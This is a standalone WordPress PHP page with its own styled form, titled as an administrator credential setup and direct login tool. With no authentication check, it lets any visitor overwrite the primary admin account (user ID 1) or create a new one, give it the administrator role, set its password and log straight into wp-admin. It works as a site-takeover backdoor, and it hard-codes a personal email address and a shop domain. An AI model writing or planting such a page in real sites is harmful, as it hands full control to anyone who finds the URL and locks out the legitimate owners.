<?php
/**
 * Administrator Credential Setup & Direct Login
 */
define('WP_USE_THEMES', false);
require_once __DIR__ . '/wp-load.php';

$message = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = sanitize_user($_POST['username'] ?? 'admin');
    $email    = sanitize_email($_POST['email'] ?? 'njengamwaura51@gmail.com');
    $password = $_POST['password'] ?? '';

    if (empty($username) || empty($password)) {
        $error = 'Username and password cannot be empty.';
    } else {
        $user = get_user_by('login', $username);
        if (!$user) {
            // Fall back to ID 1
            $user = get_user_by('id', 1);
        }

        if ($user) {
            wp_update_user([
                'ID'         => $user->ID,
                'user_login' => $username,
                'user_email' => $email,
                'user_pass'  => $password,
                'role'       => 'administrator',
            ]);
            wp_set_password($password, $user->ID);
        } else {
            $user_id = wp_create_user($username, $password, $email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }

        // Clean user session tokens and set auth cookie
        $user = get_user_by('login', $username);
        if ($user) {
            wp_clear_auth_cookie();
            wp_set_current_user($user->ID, $user->user_login);
            wp_set_auth_cookie($user->ID, true, is_ssl());
            do_action('wp_login', $user->user_login, $user);
        }

        // Direct redirect to wp-admin
        if (isset($_POST['redirect_now'])) {
            wp_safe_redirect(admin_url());
            exit;
        }

        $message = "Login credentials saved! <br><br><a href='" . esc_url(admin_url()) . "' style='display:inline-block;padding:12px 24px;background:#2271b1;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;'>Enter WP-Admin Dashboard &rarr;</a>";
    }
} else {
    $admin = get_user_by('id', 1);
    $default_user = $admin ? $admin->user_login : 'admin';
    $default_email = $admin ? $admin->user_email : 'njengamwaura51@gmail.com';
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Set WordPress Administrator Login</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .card { background: #fff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 440px; width: 100%; }
        h1 { font-size: 22px; color: #1e1e1e; margin-top: 0; margin-bottom: 8px; }
        p.subtitle { color: #646970; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
        .form-group { margin-bottom: 18px; }
        label { display: block; font-size: 13px; font-weight: 600; color: #2c3338; margin-bottom: 6px; }
        input[type="text"], input[type="email"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #dcdcde; border-radius: 6px; font-size: 15px; box-sizing: border-box; transition: border-color .2s; }
        input:focus { border-color: #2271b1; outline: none; box-shadow: 0 0 0 1px #2271b1; }
        .btn-submit { width: 100%; background: #2271b1; color: #fff; border: none; padding: 13px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background .2s; margin-top: 10px; }
        .btn-submit:hover { background: #135e96; }
        .alert-success { background: #edf7ed; color: #1e4620; padding: 15px; border-radius: 6px; border: 1px solid #c8e6c9; margin-bottom: 20px; font-size: 14px; line-height: 1.5; }
        .alert-error { background: #fde8e8; color: #9b1c1c; padding: 15px; border-radius: 6px; border: 1px solid #f8b4b4; margin-bottom: 20px; font-size: 14px; }
        .footer { margin-top: 25px; text-align: center; font-size: 13px; color: #646970; }
        .footer a { color: #2271b1; text-decoration: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Set Administrator Login</h1>
        <p class="subtitle">Set your custom username and password below to immediately access your WordPress Admin dashboard.</p>

        <?php if ($message): ?>
            <div class="alert-success"><?php echo $message; ?></div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="alert-error"><?php echo esc_html($error); ?></div>
        <?php endif; ?>

        <form method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" value="<?php echo esc_attr($_POST['username'] ?? ($default_user ?? 'admin')); ?>" required>
            </div>

            <div class="form-group">
                <label for="email">Admin Email</label>
                <input type="email" id="email" name="email" value="<?php echo esc_attr($_POST['email'] ?? ($default_email ?? 'njengamwaura51@gmail.com')); ?>" required>
            </div>

            <div class="form-group">
                <label for="password">New Password</label>
                <input type="text" id="password" name="password" placeholder="Enter your desired password" required autocomplete="new-password">
            </div>

            <button type="submit" name="redirect_now" value="1" class="btn-submit">Save &amp; Enter Dashboard</button>
        </form>

        <div class="footer">
            Standard Login URL: <a href="/wp-login.php">shopthelook.page/wp-login.php</a>
        </div>
    </div>
</body>
</html>
